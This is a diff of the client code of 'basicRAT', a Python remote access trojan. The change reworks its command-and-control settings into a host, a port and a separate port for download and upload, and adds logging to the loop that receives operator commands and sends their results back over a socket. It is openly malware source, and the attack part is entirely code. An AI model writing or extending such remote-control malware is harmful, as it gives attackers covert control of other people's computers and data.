@@ -6,9 +6,9 @@ from extras import common
 from commands import silent, active
 
 # change these to suit your needs
-c2server = ('localhost', 1337)
-
-
+c2host = 'localhost'
+c2port = 1337
+duport = 1338 # for download/upload
 #################################
 ##        Main Function        ##
 #################################
@@ -16,7 +16,7 @@ def main():
     
     # connect to basicRAT server
     conn = socket.socket()
-    conn.connect(c2server)
+    conn.connect((c2host, c2port))
 
     while True:
         results = ''
@@ -36,17 +36,19 @@ def main():
         
         try:
             if cmd in silent:
+                print "silent - {}".format(cmd)
                 com = silent[cmd]
-                com(action, conn)
+                com(action)
             
             elif cmd in active:
+                print "action - {}".format(cmd)
                 com = active[cmd]
                 results = com(action)
                 # send results here
                 conn.send(results)
                 
             else:
-                print "an invalid command was received - [ {}(\"{}\") ]".format(cmd, action)
+                print "an invalid command was received - [ {}(\"{}\") ]\n".format(cmd, action)
         
         except Exception as e:
             print e
